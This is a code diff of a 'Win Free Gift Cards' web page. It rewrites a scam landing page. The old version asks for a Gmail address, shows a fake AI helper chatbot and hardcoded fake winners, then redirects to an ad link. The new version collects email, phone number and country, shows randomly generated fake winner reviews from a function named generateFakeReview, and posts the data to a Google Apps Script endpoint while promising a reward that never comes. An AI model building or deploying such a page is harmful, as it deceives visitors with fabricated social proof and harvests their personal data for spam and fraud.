@@ -1,144 +1,198 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Win Free Gift Cards</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gift Card Giveaway</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
-      background: linear-gradient(to bottom right, #111, #333);
       font-family: 'Segoe UI', sans-serif;
-      color: white;
+      background: url('https://i.ibb.co/3MNpL5g/darkblue-neon.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
       overflow-x: hidden;
     }
+
     .container {
-      max-width: 600px;
-      margin: 80px auto;
-      padding: 30px;
-      background: rgba(0,0,0,0.8);
-      border-radius: 20px;
-      box-shadow: 0 0 20px rgba(0,255,255,0.5);
       text-align: center;
-      animation: fadeIn 1.5s ease-out;
+      padding: 3rem 1rem;
+      backdrop-filter: blur(10px);
+      background-color: rgba(0, 0, 40, 0.6);
+      margin: 5% auto;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #00f0ff;
+      animation: fadeIn 2s ease-in-out;
     }
+
+    h1 {
+      color: #00f0ff;
+      margin-bottom: 1rem;
+      font-size: 2rem;
+    }
+
+    input, select {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: none;
+      font-size: 1rem;
+      background: #222;
+      color: white;
+    }
+
+    button {
+      background: #00f0ff;
+      color: #000;
+      padding: 12px 25px;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 1rem;
+      animation: pulse 1.5s infinite;
+    }
+
+    button:hover {
+      background: #0ff;
+    }
+
+    .loading {
+      display: none;
+      margin-top: 1rem;
+    }
+
+    .reviews {
+      background: rgba(0,0,0,0.6);
+      max-height: 150px;
+      overflow-y: auto;
+      padding: 1rem;
+      border-radius: 10px;
+      margin-top: 2rem;
+      animation: slideIn 2s ease-in-out;
+    }
+
+    .review {
+      margin-bottom: 0.5rem;
+      border-bottom: 1px dashed #00f0ff;
+      padding-bottom: 0.5rem;
+    }
+
+    .cards {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      margin-top: 1.5rem;
+    }
+
+    .cards img {
+      height: 50px;
+      margin: 0.5rem;
+      filter: drop-shadow(0 0 5px #00f0ff);
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    h1 {
-      font-size: 2em;
-      color: #00ffff;
-      margin-bottom: 10px;
-    }
-    p {
-      color: #ccc;
-      margin-bottom: 20px;
-    }
-    input[type="email"] {
-      padding: 12px;
-      width: 80%;
-      border: none;
-      border-radius: 8px;
-      font-size: 1em;
-      margin-bottom: 20px;
-    }
-    .submit-btn {
-      padding: 12px 25px;
-      background: #00ffff;
-      border: none;
-      border-radius: 10px;
-      color: #000;
-      font-size: 1em;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .reviews {
-      margin-top: 40px;
-      text-align: left;
-      max-height: 200px;
-      overflow-y: auto;
-    }
-    .review {
-      background: rgba(255,255,255,0.05);
-      padding: 10px 15px;
-      margin-bottom: 10px;
-      border-radius: 10px;
-      font-size: 0.9em;
-    }
-    .name {
-      color: #00ffff;
-      font-weight: bold;
-    }
-    .amount {
-      color: #0f0;
-      font-weight: bold;
-    }
-    #loading {
-      display: none;
-      margin-top: 20px;
-    }
-    #chatbot {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: #222;
-      padding: 15px;
-      border-radius: 15px;
-      width: 250px;
-      box-shadow: 0 0 10px rgba(0,255,255,0.4);
-      font-size: 0.9em;
-    }
-    #chatbot p {
-      margin: 5px 0;
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(-20px); }
+      to { opacity: 1; transform: translateX(0); }
     }
   </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>🎁 Win 100% Free Gift Cards!</h1>
-  <p>Enter your Gmail to get a chance to win $5–$100 gift cards instantly.</p>
-  <input type="email" id="email" placeholder="Enter your Gmail..." />
-  <br>
-  <button class="submit-btn" onclick="handleSubmit()">Submit & Win</button>
-  <div id="loading">🔄 Checking eligibility, please wait...</div>
+  <div class="container">
+    <h1>🎁 Win Free Gift Cards 🎉</h1>
+    <p>Submit your details to enter the lucky draw and win 100% FREE gift cards!</p>
+    
+    <form id="giftForm">
+      <input type="email" name="email" placeholder="Enter Gmail" required />
+      <input type="text" name="number" placeholder="Phone Number" required />
+      <select name="country" required>
+        <option value="">Select Country</option>
+        <option value="USA">USA</option>
+        <option value="India">India</option>
+        <option value="UK">UK</option>
+        <option value="Philippines">Philippines</option>
+        <option value="Other">Other</option>
+      </select>
+      <button type="submit">Submit</button>
+    </form>
 
-  <div class="reviews" id="reviewBox">
-    <div class="review"><span class="name">Ali***</span> just received <span class="amount">$5</span> 🎉</div>
-    <div class="review"><span class="name">Mar***</span> got <span class="amount">$25</span> gift card 🤑</div>
-    <div class="review"><span class="name">Jen***</span> claimed <span class="amount">$100</span> 😍</div>
-    <div class="review"><span class="name">Dav***</span> won <span class="amount">$10</span> 🎈</div>
-    <div class="review"><span class="name">Tom***</span> got <span class="amount">$50</span> 🎁</div>
-    <div class="review"><span class="name">Zah***</span> claimed <span class="amount">$15</span> 💰</div>
-    <div class="review"><span class="name">Vic***</span> just received <span class="amount">$20</span> 🎊</div>
+    <div class="loading" id="loading">
+      <p>⏳ Processing your entry...</p>
+    </div>
+
+    <div class="cards">
+      <img src="https://i.ibb.co/D1JkP61/paypal.png" alt="PayPal" />
+      <img src="https://i.ibb.co/6gZLnyz/amazon.png" alt="Amazon" />
+      <img src="https://i.ibb.co/0ZQz5d3/playstore.png" alt="Play Store" />
+      <img src="https://i.ibb.co/8xjNH5c/steam.png" alt="Steam" />
+      <img src="https://i.ibb.co/xFW1FZr/crypto.png" alt="Crypto" />
+    </div>
+
+    <div class="reviews" id="reviews"></div>
   </div>
-</div>
 
-<div id="chatbot">
-  <p><strong>AI Helper 🤖:</strong></p>
-  <p>Hi there! Enter your Gmail and click submit to see if you're lucky today! 🎉</p>
-</div>
+  <audio id="successSound" src="https://www.soundjay.com/buttons/sounds/button-4.mp3" preload="auto"></audio>
 
-<audio id="ding" src="https://www.soundjay.com/buttons/sounds/button-10.mp3" preload="auto"></audio>
+  <script>
+    const form = document.getElementById("giftForm");
+    const loading = document.getElementById("loading");
+    const sound = document.getElementById("successSound");
+    const reviews = document.getElementById("reviews");
 
-<script>
-  function handleSubmit() {
-    const email = document.getElementById("email").value;
-    if(email && email.includes("@gmail.com")) {
-      document.getElementById("loading").style.display = "block";
-      document.getElementById("ding").play();
-      alert("Success! You're being redirected to get your reward...");
-      setTimeout(() => {
-        window.location.href = "https://www.profitableratecpm.com/n4wv2v3q7z?key=d992a85b93c8a19e201fbe79368044cd";
-      }, 3000);
-    } else {
-      alert("Please enter a valid Gmail address.");
+    const NAMES = ["Rahul", "James", "Alexa", "Maya", "Usman", "Tanaka", "Chloe", "Ali", "Ivan", "Pedro"];
+    const AMOUNTS = [5, 10, 15, 20, 25, 50, 100];
+
+    function generateFakeReview() {
+      const name = NAMES[Math.floor(Math.random() * NAMES.length)];
+      const amount = AMOUNTS[Math.floor(Math.random() * AMOUNTS.length)];
+      return `<div class="review">🌟 ${name.charAt(0)}*** just won $${amount} gift card!</div>`;
     }
-  }
-</script>
 
+    function updateReviews() {
+      reviews.innerHTML = "";
+      for (let i = 0; i < 8; i++) {
+        reviews.innerHTML += generateFakeReview();
+      }
+    }
+
+    setInterval(updateReviews, 5000);
+    updateReviews();
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      loading.style.display = "block";
+
+      setTimeout(() => {
+        sound.play();
+        const data = new FormData(form);
+        fetch("https://script.google.com/macros/s/AKfycbyzoCkkofRsucu2Q-EFOiyD0MUpc_X-BOw6-H16h-pDQOtaUWCmoKBdjTPm41usaGgt/exec", {
+          method: "POST",
+          body: data
+        })
+        .then(res => {
+          loading.innerHTML = "<p>✅ Submitted Successfully! You may receive your reward soon.</p>";
+          form.reset();
+        })
+        .catch(err => {
+          loading.innerHTML = "<p>❌ Error submitting data.</p>";
+        });
+      }, 2500);
+    });
+  </script>
 </body>
 </html>
